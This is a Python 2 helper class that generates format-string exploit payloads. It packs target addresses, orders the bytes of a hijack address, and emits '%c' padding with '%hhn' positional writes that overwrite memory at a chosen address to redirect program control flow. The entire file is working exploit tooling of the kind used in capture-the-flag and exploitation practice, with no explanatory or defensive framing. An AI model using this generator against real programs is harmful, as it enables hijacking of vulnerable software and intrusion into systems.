import struct
import math

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)
get_byte = lambda x : (x[0], x[1] & 0xff)

class FormatStringExploit:
    printed = 0
    def __init__(self, offset=0, printed=0, hijack_target=None, hijack_address=None):
        self.offset = offset
        self.hijack_target = hijack_target
        self.hijack_address = hijack_address
        FormatStringExploit.printed += printed
        self.table = {
                32 : [p32, 4],
                64 : [p64, 6]
                }

    def generate32(self):
        adr = self.address_setup()
        payload = self.generate_target(adr, 32)
        adr = map(lambda x : x[1], adr)
        payload += self.generate_fmt(adr)
        return payload

    def address_setup(self, size=4):
        '''Arrange size of addres per byte for optimization'''
        adr = [(i, self.hijack_address >> 8 * i) for i in xrange(size)]
        adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
        return adr
        
    def generate_target(self, adr, bits):
        payload = ''.join(self.table[bits][0](self.hijack_target + i[0]) for i in adr)
        FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
        return payload

    def generate_fmt(self, adr):
        payload = ''
        for idx, byte in enumerate(adr):
            pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%{}c".format(pad)
            payload += "%{}$hhn".format(self.offset + idx)
            FormatStringExploit.printed += pad
        return payload


    def size(self):
        '''Return already printed words'''
        return FormatStringExploit.printed
